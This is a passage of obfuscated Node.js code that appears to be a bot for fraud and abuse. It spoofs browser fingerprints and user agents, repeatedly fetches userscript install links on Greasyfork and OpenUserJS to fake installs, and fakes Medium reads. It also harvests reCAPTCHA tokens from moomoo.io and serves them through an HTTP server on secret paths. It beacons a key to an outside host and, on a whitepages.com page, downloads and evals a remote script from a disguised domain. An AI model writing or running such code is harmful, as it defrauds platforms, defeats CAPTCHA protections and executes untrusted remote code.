      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + X(0x15) + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + X(0x17) + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + Y(0x7) + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x2, '@Vso') + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + X(0x17) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + Y(0xf) + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    X(0x10) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + X(0x16) + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xa * 0x41 + 0x9d5 + -0x74b
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h[a0(0xb)](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * 0x95 + 0xfbb * -0x1 + 0x115 * 0xe)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xac5 + -0x1 * -0x11fb + -0x6d2), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * 0x1068 + -0x10ea + 0x1 * 0xe6), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1caf * -0x1 + 0x89 * -0x2b + 0xb * -0x84;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x20a4 + -0x13de + 0x5e * 0x8f; w < getRandomInt(0x1412 + -0xc5f * 0x3 + 0x110c, 0x25d + 0xf25 * -0x2 + 0x1bf2); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x3 * 0x1210 + 0x1ca5 * -0x1 + 0x13d35);
        }
      }();
    }, -0x1c0b + 0x8fb + -0xa * -0x1f2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x18c4 * -0x1 + 0x1 * -0x167 + 0x1a2b;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x6c0 + 0x32 * -0x40 + 0x5c0, 0x1c9 * 0x1 + -0x22ec + -0x1 * -0x2155)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x6d27 * -0x1 + -0xa6 * 0x46 + 0x61 * 0x8d);
    }, -0xa8d + 0x236a + -0x1879), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x449 + 0x79 + 0x261 * -0x2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2487 + -0xb72 + 0x3bb1 * 0x1), await u['evaluate'](() => {
            const a1 = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + a1(0xd) + 'me/cdn/xm7' + '7/wp.js', 0x2 * 0x71b + -0x1 * 0x19ab + -0x7 * -0x1a3), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xfbcff * -0x1 + 0xe619b + -0x507ac * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x264c + 0x1 * 0x113f + 0x1f3 * 0xb);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1eab + 0xd88 + -0x8af * 0x5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x5 * 0x6d7 + -0xe5 * 0x3 + 0xc);
}
doFlags['doOUJS'] && ((async () => {
  const bj = {
      f: 0x5
    },
    a3 = b;
  async function f() {
    const a2 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x115d + -0x1 * 0x24cd + 0x362b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xb * 0xc1 + -0x1d * 0xb3 + 0xbfd));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xc0a * -0x2 + -0xa2 * 0x2b + -0x1 * -0x322, D['indexOf']('\x20'));
        return B ? E['slice'](0x172c + -0x14c * 0x17 + 0xc * 0x8e, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x22b8 + -0x2 * 0x1fdd + 0x4412),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + a2(0x1b) + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x34b + -0x2 * 0x1eaf + -0x67b9 * -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + a3(0xe, '(VQf') + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + a3(bj.f, 'Jod^') + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x73d * 0x1 + 0x1526 + -0xde9; k < 0x12ae + 0x11fc * -0x2 + 0x114e; k++)
    setTimeout(f, (-0x2221 + -0x31f * 0x61 + 0x23b40) * k * getRandomInt(0x1 * -0x1a23 + -0x8a0 + 0x22c4, 0x1455 + -0xf64 * -0x2 + -0x198d * 0x2));
  setInterval(() => {
    f();
    for (let l = -0x1202 + 0x2b * 0xc5 + -0x75 * 0x21; l < 0x1277 + -0x6b * 0x52 + -0xfd3 * -0x1; l++)
      setTimeout(f, (0x3c0d + 0x1b31f + 0x4133 * -0x4) * l * getRandomInt(-0x2c3 + -0x9f7 + 0x1 * 0xcbb, -0x1989 + 0x1d7f + -0x3f3));
  }, 0x2443d7 + 0x1 * -0x22e8b3 + 0x35935c);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
